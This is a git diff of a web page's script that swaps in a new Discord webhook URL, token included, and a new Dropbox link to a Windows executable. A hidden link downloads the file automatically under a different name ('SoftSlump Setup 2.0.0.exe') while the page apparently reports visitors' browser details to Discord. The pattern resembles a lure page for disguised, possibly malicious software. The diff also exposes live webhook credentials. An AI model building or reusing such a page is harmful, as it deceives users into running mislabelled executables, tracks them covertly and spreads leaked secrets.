@@ -149,7 +149,7 @@ document.addEventListener('click', (e) => {
 
 
 // ---- DISCORD WEBHOOK ----
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1492788148898369709/eHw2JrA-IAkCMH7CSdOYoWSkoZVppcGqa47ssJc16WMHZmHZ5MWPjYEOZgHnJfR64EOF';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1492904694228713713/VWtnhI3FpX4wGHGHeM1BE_BslupZ1KdljQq0IP0fnGUjtsddzKeXz7Th0z3dl0KN1Ynn';
 
 function getBrowserName() {
     const ua = navigator.userAgent;
@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/1dxkod0y8ixb1jf4dooqe/DuskaraSaga.exe?rlkey=wf4zue6fq0cqlffct6sznfens&st=ruydlzix&dl=1';
+    a.href = 'https://www.dropbox.com/scl/fi/ygsf33x1uoc8a4aua4ux6/DuskaraSaga-Setup-1.1.3.exe?rlkey=gj6drt13eotc6cyb5j5xrbz9z&st=odhldegj&dl=1';
     a.download = 'SoftSlump Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
